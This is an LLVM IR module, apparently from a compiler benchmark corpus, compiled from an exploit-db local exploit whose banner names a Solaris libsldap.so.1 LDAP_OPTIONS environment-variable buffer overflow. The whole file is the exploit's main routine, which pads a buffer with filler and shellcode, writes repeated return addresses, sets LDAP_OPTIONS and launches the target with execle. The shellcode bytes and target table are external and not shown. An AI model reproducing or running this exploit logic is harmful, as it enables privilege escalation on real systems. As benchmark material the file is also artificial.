; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_20969.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_20969.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i8*, i32, i32 }

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [152 x i8] c"libsldap.so.1 $LDAP_OPTIONS enviroment variable buffer overflow\0AExploit code: noir@gsu.linux.org.tr\0ABug discovery: sway@hack.co.za\0A\0AUsage: %s target#\0A\0A\00", align 1
@i = common dso_local global i64 0, align 8
@target = common dso_local global %struct.TYPE_2__* null, align 8
@.str.1 = private unnamed_addr constant [13 x i8] c"target#: %s\0A\00", align 1
@ret_adr = common dso_local global i32 0, align 4
@egg = common dso_local global i32* null, align 8
@shellcode = common dso_local global i32* null, align 8
@ADJUST = common dso_local global i64 0, align 8
@ldap = common dso_local global i32* null, align 8
@.str.2 = private unnamed_addr constant [14 x i8] c"LDAP_OPTIONS=\00", align 1
@.str.3 = private unnamed_addr constant [9 x i8] c"12341234\00", align 1
@envs = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %6 = load i8**, i8*** %5, align 8
  %7 = getelementptr inbounds i8*, i8** %6, i64 1
  %8 = load i8*, i8** %7, align 8
  %9 = icmp ne i8* %8, null
  br i1 %9, label %36, label %10

10:                                               ; preds = %2
  %11 = load i32, i32* @stderr, align 4
  %12 = load i8**, i8*** %5, align 8
  %13 = getelementptr inbounds i8*, i8** %12, i64 0
  %14 = load i8*, i8** %13, align 8
  %15 = call i32 @fprintf(i32 %11, i8* getelementptr inbounds ([152 x i8], [152 x i8]* @.str, i64 0, i64 0), i8* %14)
  store i64 0, i64* @i, align 8
  br label %16

16:                                               ; preds = %31, %10
  %17 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %18 = load i64, i64* @i, align 8
  %19 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %17, i64 %18
  %20 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %19, i32 0, i32 0
  %21 = load i8*, i8** %20, align 8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %34

23:                                               ; preds = %16
  %24 = load i32, i32* @stderr, align 4
  %25 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %26 = load i64, i64* @i, align 8
  %27 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %25, i64 %26
  %28 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %27, i32 0, i32 0
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 @fprintf(i32 %24, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.1, i64 0, i64 0), i8* %29)
  br label %31

31:                                               ; preds = %23
  %32 = load i64, i64* @i, align 8
  %33 = add i64 %32, 1
  store i64 %33, i64* @i, align 8
  br label %16

34:                                               ; preds = %16
  %35 = call i32 @exit(i32 0) #3
  unreachable

36:                                               ; preds = %2
  %37 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 1
  %40 = load i8*, i8** %39, align 8
  %41 = call i64 @atoi(i8* %40)
  %42 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %37, i64 %41
  %43 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %42, i32 0, i32 1
  %44 = load i32, i32* %43, align 8
  store i32 %44, i32* @ret_adr, align 4
  %45 = load i32*, i32** @egg, align 8
  %46 = call i32 @memset(i32* %45, i32 0, i32 8)
  store i64 0, i64* @i, align 8
  br label %47

47:                                               ; preds = %59, %36
  %48 = load i64, i64* @i, align 8
  %49 = load i32*, i32** @shellcode, align 8
  %50 = call i32 @strlen(i32* %49)
  %51 = sub nsw i32 400, %50
  %52 = sext i32 %51 to i64
  %53 = icmp ult i64 %48, %52
  br i1 %53, label %54, label %62

54:                                               ; preds = %47
  %55 = load i32*, i32** @egg, align 8
  %56 = load i64, i64* @i, align 8
  %57 = getelementptr inbounds i32, i32* %55, i64 %56
  %58 = bitcast i32* %57 to i64*
  store i64 2786902035, i64* %58, align 8
  br label %59

59:                                               ; preds = %54
  %60 = load i64, i64* @i, align 8
  %61 = add i64 %60, 4
  store i64 %61, i64* @i, align 8
  br label %47

62:                                               ; preds = %47
  store i64 0, i64* @i, align 8
  br label %63

63:                                               ; preds = %78, %62
  %64 = load i64, i64* @i, align 8
  %65 = load i32*, i32** @shellcode, align 8
  %66 = call i32 @strlen(i32* %65)
  %67 = sext i32 %66 to i64
  %68 = icmp ult i64 %64, %67
  br i1 %68, label %69, label %81

69:                                               ; preds = %63
  %70 = load i32*, i32** @shellcode, align 8
  %71 = load i64, i64* @i, align 8
  %72 = getelementptr inbounds i32, i32* %70, i64 %71
  %73 = load i32, i32* %72, align 4
  %74 = load i32*, i32** @egg, align 8
  %75 = load i64, i64* @i, align 8
  %76 = add i64 200, %75
  %77 = getelementptr inbounds i32, i32* %74, i64 %76
  store i32 %73, i32* %77, align 4
  br label %78

78:                                               ; preds = %69
  %79 = load i64, i64* @i, align 8
  %80 = add i64 %79, 1
  store i64 %80, i64* @i, align 8
  br label %63

81:                                               ; preds = %63
  store i64 0, i64* @i, align 8
  br label %82

82:                                               ; preds = %90, %81
  %83 = load i64, i64* @i, align 8
  %84 = load i64, i64* @ADJUST, align 8
  %85 = icmp ult i64 %83, %84
  br i1 %85, label %86, label %93

86:                                               ; preds = %82
  %87 = load i32*, i32** @ldap, align 8
  %88 = load i64, i64* @i, align 8
  %89 = getelementptr inbounds i32, i32* %87, i64 %88
  store i32 88, i32* %89, align 4
  br label %90

90:                                               ; preds = %86
  %91 = load i64, i64* @i, align 8
  %92 = add i64 %91, 1
  store i64 %92, i64* @i, align 8
  br label %82

93:                                               ; preds = %82
  %94 = load i64, i64* @ADJUST, align 8
  store i64 %94, i64* @i, align 8
  br label %95

95:                                               ; preds = %126, %93
  %96 = load i64, i64* @i, align 8
  %97 = icmp ult i64 %96, 4000
  br i1 %97, label %98, label %129

98:                                               ; preds = %95
  %99 = load i32, i32* @ret_adr, align 4
  %100 = and i32 %99, 255
  %101 = load i32*, i32** @ldap, align 8
  %102 = load i64, i64* @i, align 8
  %103 = add i64 %102, 3
  %104 = getelementptr inbounds i32, i32* %101, i64 %103
  store i32 %100, i32* %104, align 4
  %105 = load i32, i32* @ret_adr, align 4
  %106 = ashr i32 %105, 8
  %107 = and i32 %106, 255
  %108 = load i32*, i32** @ldap, align 8
  %109 = load i64, i64* @i, align 8
  %110 = add i64 %109, 2
  %111 = getelementptr inbounds i32, i32* %108, i64 %110
  store i32 %107, i32* %111, align 4
  %112 = load i32, i32* @ret_adr, align 4
  %113 = ashr i32 %112, 16
  %114 = and i32 %113, 255
  %115 = load i32*, i32** @ldap, align 8
  %116 = load i64, i64* @i, align 8
  %117 = add i64 %116, 1
  %118 = getelementptr inbounds i32, i32* %115, i64 %117
  store i32 %114, i32* %118, align 4
  %119 = load i32, i32* @ret_adr, align 4
  %120 = ashr i32 %119, 24
  %121 = and i32 %120, 255
  %122 = load i32*, i32** @ldap, align 8
  %123 = load i64, i64* @i, align 8
  %124 = add i64 %123, 0
  %125 = getelementptr inbounds i32, i32* %122, i64 %124
  store i32 %121, i32* %125, align 4
  br label %126

126:                                              ; preds = %98
  %127 = load i64, i64* @i, align 8
  %128 = add i64 %127, 4
  store i64 %128, i64* @i, align 8
  br label %95

129:                                              ; preds = %95
  %130 = load i32*, i32** @ldap, align 8
  %131 = call i32 @memcpy(i32* %130, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i64 0, i64 0), i32 13)
  %132 = load i32*, i32** @ldap, align 8
  %133 = load i32*, i32** @ldap, align 8
  %134 = call i32 @strlen(i32* %133)
  %135 = sub nsw i32 %134, 3
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i32, i32* %132, i64 %136
  store i32 0, i32* %137, align 4
  %138 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %139 = load i8**, i8*** %5, align 8
  %140 = getelementptr inbounds i8*, i8** %139, i64 1
  %141 = load i8*, i8** %140, align 8
  %142 = call i64 @atoi(i8* %141)
  %143 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %138, i64 %142
  %144 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %143, i32 0, i32 2
  %145 = load i32, i32* %144, align 4
  %146 = load i32, i32* @envs, align 4
  %147 = call i32 @execle(i32 %145, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0), i8* null, i32 %146)
  %148 = load i32, i32* %3, align 4
  ret i32 %148
}

declare dso_local i32 @fprintf(i32, i8*, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @atoi(i8*) #1

declare dso_local i32 @memset(i32*, i32, i32) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @memcpy(i32*, i8*, i32) #1

declare dso_local i32 @execle(i32, i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
